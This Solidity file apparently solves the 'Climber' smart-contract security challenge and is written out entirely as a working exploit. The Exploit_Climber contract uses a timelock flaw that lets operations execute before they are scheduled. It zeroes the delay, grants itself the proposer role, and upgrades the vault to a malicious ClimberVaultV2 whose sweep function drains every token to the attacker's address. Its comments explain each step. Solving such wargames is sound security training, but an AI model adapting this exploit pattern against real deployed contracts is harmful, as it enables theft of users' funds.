// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";

contract ClimberVaultV2 is ClimberVault {
    function sweep(IERC20 token, address attackerEOA) public {
        token.transfer(attackerEOA, token.balanceOf(address(this)));
    }
}

contract Exploit_Climber {
    ClimberVault vault;
    ClimberTimelock timelock;
    IERC20 token;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    constructor(ClimberVault _vault, IERC20 _token) {
        vault = _vault;
        timelock = ClimberTimelock(payable(vault.owner()));
        token = _token;
    }

    function exploit() public payable {
        targets = [
            address(timelock),
            address(timelock),
            address(vault),
            address(this)
        ];
        values = [0, 0, 0, 0];
        dataElements = [
            //set the delay to 0 to not get blocked by it.
            abi.encodeWithSelector(timelock.updateDelay.selector, 0),
            //grant this contract 'PROPOSER' role so it can schedule actions.
            abi.encodeWithSelector(
                timelock.grantRole.selector,
                PROPOSER_ROLE,
                address(this)
            ),
            //upgrade the contract with ClimberVaultV2 contract we created.
            abi.encodeWithSelector(
                vault.upgradeToAndCall.selector,
                address(new ClimberVaultV2()), //new implementation address
                // call that will be made after updating the implementation contract
                // the call will transfer all the tokens to attackerEOA
                abi.encodeWithSelector(
                    //malicious function that we insterted into the new logic contract
                    ClimberVaultV2.sweep.selector,
                    address(token),
                    msg.sender //attacker's EOA
                )
            ),
            //lastly call the function in this contract that schedules
            //all the these calls.
            abi.encodeWithSignature("scheduleOperation()")
        ];
        //execute the actions above
        timelock.execute(targets, values, dataElements, 0);
    }

    function scheduleOperation() public payable {
        //here the first three calls is made. Lastly we need to
        //schedule these calls so execute function does not revert.
        //we can make this call because we granted 'PROPOSER' role 
        //to this contract prior to this.
        timelock.schedule(targets, values, dataElements, 0);
    }
}
